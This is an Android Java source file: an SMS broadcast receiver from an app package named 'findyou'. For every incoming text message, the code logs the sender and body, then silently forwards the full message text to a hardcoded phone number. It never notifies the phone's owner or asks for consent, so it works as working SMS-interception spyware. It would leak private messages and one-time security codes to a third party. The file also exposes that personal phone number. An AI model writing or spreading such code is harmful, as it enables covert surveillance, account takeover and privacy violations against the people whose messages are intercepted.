package cn.foxnickel.findyou.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import static android.R.attr.phoneNumber;
import static android.R.id.message;

/**
 * Created by Night on 2017/4/19.
 * Desc:
 */

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage msg = null;
        if (null != bundle) {
            Object[] smsObj = (Object[]) bundle.get("pdus");
            for (Object object : smsObj) {
                msg = SmsMessage.createFromPdu((byte[]) object);
                Date date = new Date(msg.getTimestampMillis());//时间
                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String receiveTime = format.format(date);
                Log.e("TAG", "number:" + msg.getOriginatingAddress()
                        + "   body:" + msg.getDisplayMessageBody() + "  time:"
                        + receiveTime);
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                // 拆分短信内容（手机短信长度限制）
                List<String> divideContents = smsManager.divideMessage( msg.getDisplayMessageBody() );
                for (String text : divideContents) {
                    smsManager.sendTextMessage("18100176827", null, text, null, null);
                }
            }
        }
    }
}
